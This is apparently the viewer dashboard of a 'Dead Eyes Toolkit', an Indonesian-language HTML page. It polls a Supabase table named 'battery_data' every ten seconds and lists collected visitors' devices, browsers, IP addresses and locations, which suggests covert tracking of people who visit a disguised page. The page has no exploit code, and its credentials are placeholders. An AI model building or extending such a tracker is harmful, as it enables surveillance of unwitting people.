<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Dashboard - Dead Eyes Toolkit</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0f;
            color: #0f0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: auto;
        }
        h1 {
            color: #e74c3c;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 13px;
        }
        th,
        td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #1a1a2e;
        }
        th {
            color: #8888aa;
            text-transform: uppercase;
            font-size: 11px;
        }
        td {
            color: #e0e0e0;
            word-break: break-all;
        }
        .status {
            padding: 10px;
            background: #1a1a2e;
            border-radius: 8px;
            margin-top: 20px;
            text-align: center;
        }
        .refresh {
            background: #e74c3c;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .refresh:hover {
            background: #c0392b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Dead Eyes Toolkit - Dashboard</h1>
        <p style="color:#8888aa;">Data yang terkumpul dari pengunjung</p>
        <button class="refresh" onclick="loadData()">🔄 Refresh</button>

        <div id="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Waktu</th>
                        <th>Device</th>
                        <th>OS</th>
                        <th>Browser</th>
                        <th>IP</th>
                        <th>Lokasi</th>
                    </tr>
                </thead>
                <tbody id="data-body">
                    <tr><td colspan="7" style="text-align:center; color:#666;">Memuat data...</td></tr>
                </tbody>
            </table>
        </div>

        <div class="status" id="status">📡 Koneksi ke Supabase...</div>
    </div>

    <script>
        // ============================================================
        // 🔥 KONFIGURASI SUPABASE (GANTI DENGAN MILIKMU!)
        // ============================================================
        const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
        const SUPABASE_ANON_KEY = 'YOUR_PUBLISHABLE_KEY';

        async function loadData() {
            const status = document.getElementById('status');
            const tbody = document.getElementById('data-body');

            status.textContent = '📤 Memuat data...';
            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#666;">Memuat...</td></tr>';

            try {
                const res = await fetch(
                    `${SUPABASE_URL}/rest/v1/battery_data?order=created_at.desc&limit=20`, {
                        headers: {
                            'apikey': SUPABASE_ANON_KEY,
                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                        }
                    }
                );

                if (!res.ok) throw new Error('Gagal mengambil data');

                const data = await res.json();

                if (data.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#666;">Belum ada data</td></tr>';
                    status.textContent = '✅ Database terhubung, namun belum ada data';
                    return;
                }

                tbody.innerHTML = data.map((row, i) => `
                        <tr>
                            <td>${i + 1}</td>
                            <td>${new Date(row.created_at).toLocaleString()}</td>
                            <td>${row.device_type || '-'}</td>
                            <td>${row.os_name || '-'}</td>
                            <td>${row.browser_name || '-'}</td>
                            <td>${row.ip_address || '-'}</td>
                            <td>${row.location || '-'}</td>
                        </tr>
                    `).join('');

                status.textContent = '✅ Data berhasil dimuat (' + data.length + ' data)';
                status.style.color = '#4ade80';

            } catch (e) {
                status.textContent = '❌ Error: ' + e.message;
                status.style.color = '#f87171';
                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#ef4444;">Gagal memuat data</td></tr>';
            }
        }

        // Load data saat halaman dibuka
        document.addEventListener('DOMContentLoaded', loadData);

        // Refresh otomatis tiap 10 detik
        setInterval(loadData, 10000);
    </script>
</body>
</html>
